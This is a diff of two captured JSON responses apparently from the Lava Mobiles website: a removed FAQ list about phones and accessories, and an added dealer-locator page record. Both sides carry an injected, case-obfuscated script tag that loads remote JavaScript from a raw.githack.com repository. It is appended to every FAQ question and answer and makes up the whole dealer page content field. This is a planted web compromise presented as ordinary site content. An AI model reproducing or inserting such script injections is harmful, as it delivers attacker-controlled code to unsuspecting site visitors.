@@ -1,80 +1,36 @@
 {
-  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/faq.json",
+  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/lavastoredealer.json",
   "method": "GET",
   "status": 200,
   "content_type": "application/json",
   "body": {
     "pageProps": {
-      "faqData": {
+      "DealerLocatorPge": {
         "status": 1,
-        "msg": "FAQ List!",
-        "faqs": [
-          {
-            "id": 2,
-            "qsn": "What are the important features to consider when buying a smartphone?<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-            "ans": "<p>When buying a smartphone, some of the important features to consider include:</p>\r\n<ul>\r\n            <li><strong>Display:</strong> Look for a display with high resolution, good viewing angles, and accurate\r\n                colors, ideally 6.1\u201d or larger in size.</li>\r\n            <li><strong>Processor:</strong> A fast processor, like the MediaTek Octa-core processors, is important for\r\n                smooth multitasking and running demanding apps and games.</li>\r\n            <li><strong>Battery life:</strong> Consider the battery capacity and look for a phone with a long battery\r\n                life, especially if you are someone who uses your phone frequently. The industry standard nowadays is\r\n                around 5000mAh.</li>\r\n            <li><strong>Camera:</strong> If you're interested in taking high-quality photos with your phone, consider\r\n                the camera specs, including the number of megapixels, aperture size, and image stabilization. For\r\n                example, most modern smartphones have at least 13 megapixel cameras.</li>\r\n            <li><strong>Storage:</strong> Consider how much storage you'll need for your apps, photos, and other files.\r\n                With app sizes going up, at least 32GB of onboard storage is a must have.</li>\r\n            <li><strong>Operating System:</strong> Make sure the phone runs an operating system you're familiar with and\r\n                that you like. For example, Android is the most popular mobile OS in India. It supports all the latest\r\n                apps and games.</li>\r\n            <li><strong>Price:</strong> Consider your budget and look for a phone that offers good value for money.</li>\r\n        </ul><sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>"
-          },
-          {
-            "id": 3,
-            "qsn": "What is the storage capacity of Lava Mobiles?<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-            "ans": "The storage capacity of Lava Mobiles depends on the variant you wish to buy. For example, the Lava Blaze 5G comes with UFS 128GB system memory which is expandable up to 1TB. On the other hand, the entry-level Yuva Pro comes with 32GB in-built storage which is expandable up to 512GB.<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>"
-          },
-          {
-            "id": 4,
-            "qsn": "What is the latest Android version supported by Lava Mobiles?<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-            "ans": "All latest smartphones from Lava Mobiles come with the latest Android operating system and support further OS and security updates as they become available.<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>"
-          },
-          {
-            "id": 5,
-            "qsn": "Is Lava Mobiles an Indian smartphone brand?<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-            "ans": "Yes. Lava Mobiles is among the smartphone brands that are vocal for local and provide made in India phones. Lava Mobiles is based in Noida, Uttar Pradesh, India.<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>"
-          },
-          {
-            "id": 6,
-            "qsn": "Which are the latest smartphones by Lava Mobiles?<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-            "ans": "Lava Mobiles currently offer smartphones under three categories, beginner, youth centric, and gaming smartphones. The Yuva series is our beginner range of smartphones. The Blaze smartphones focus on providing a balanced performance for youth buying their first smartphone, and the Agni series features the best gaming phones in their category.<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>"
-          },
-          {
-            "id": 7,
-            "qsn": "What are the features of a feature phone?<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-            "ans": "A feature phone, also known as a basic phone or keypad phone, is a type of mobile phone that typically has limited capabilities compared to a smartphone. It offers essential features like:<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>"
-          },
-          {
-            "id": 8,
-            "qsn": "Can feature phones access the Internet?<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-            "ans": "Yes, some feature phones can access the internet, although their internet capabilities are generally limited compared to smartphones. However, the internet experience on a feature phone is usually slower and less smooth than on a smartphone due to the limited processing power and memory. Additionally, feature phones may not support some of the more demanding or complex internet-based applications and services. Nowadays, feature phones are used as backup phones by smartphone users or by people who are not savvy enough to use smartphones. Hence, most feature phones do not support internet access and are limited to basic call and text functions and entertainment.<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>"
-          },
-          {
-            "id": 9,
-            "qsn": "How safe are feature phones?<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-            "ans": "From the point of data safety, feature phones are still considered less vulnerable to cyber threats compared to smartphones, as they have less complex operating systems and fewer built-in apps.<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>"
-          },
-          {
-            "id": 10,
-            "qsn": "Is there a camera on feature phones?<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-            "ans": "Yes, feature phones typically come with basic camera capabilities and the camera has a lower megapixel count. However, despite these limitations, the camera on a feature phone can still be useful for taking basic photos or recording basic video. For example, the A7 Star feature phone by Lava Mobiles comes with a VGA camera that supports zoom and video recording features.<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>"
-          },
-          {
-            "id": 11,
-            "qsn": "Can I run WhatsApp on a feature phone?<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-            "ans": "No. Modern feature phones do not support running WhatsApp as the latest versions of the app are no longer supported by the mobile OS of feature phones.<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>"
-          },
-          {
-            "id": 12,
-            "qsn": "What types of mobile accessories are made by Lava Mobiles?<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-            "ans": "Lava Mobiles offers a comprehensive range of smartphone accessories including wireless earphones, bluetooth neckbands, and mobile power banks. Our mobile accessories cater to the diverse needs of users. For example, you can pick up Probuds for a truly wireless audio experience or go with Probuds N11 neckband that is more suited for fitness enthusiasts.<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>"
-          },
-          {
-            "id": 13,
-            "qsn": "Which are the latest mobile accessories by Lava Mobiles?<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-            "ans": "The latest smartphone accessories from Lava Mobiles include the Probuds 21 (with up to 9 hours of battery life) and Probuds N11 offering the best audio output in their price range. You can also check out the accessories section on our website.<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>"
-          },
-          {
-            "id": 14,
-            "qsn": "Can I use a Lava Mobiles accessory with other smartphones?<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-            "ans": "Yes. While Lava Mobiles accessories work best when paired with our own range of smartphones, you can use the accessories with other smartphones as well. Lava Mobiles accessories feature the latest version of Bluetooth 5.0 and are compatible with all types of smartphones, laptops, and other pairing devices.&nbsp; &nbsp;<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>"
-          }
-        ]
+        "msg": "dealer-locator Page Content",
+        "data": {
+          "id": 13,
+          "slug": "dealer-locator",
+          "name": "Dealer Locator",
+          "sub_text": null,
+          "content1": "<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
+          "content2": null,
+          "content3": null,
+          "content4": null,
+          "content5": null,
+          "content6": null,
+          "page_title": "Lava Store Dealers, Lava Retailers List Online in India - LAVA Mobiles",
+          "meta_keywords": "Dealer Locator",
+          "meta_description": "Lava Store Dealers, Lava Retailers List Online in India - LAVA Mobiles",
+          "meta_other": null,
+          "video_url": null,
+          "image": "media/cmspage/image/bannse-1920x695-location--1721039627.webp",
+          "image_alt": null,
+          "image_mobile": "media/cmspage/image_mobile/frame-157503-1703566570.webp",
+          "status": 1
+        },
+        "leadership": {},
+        "success": "success"
       }
     },
     "__N_SSG": true
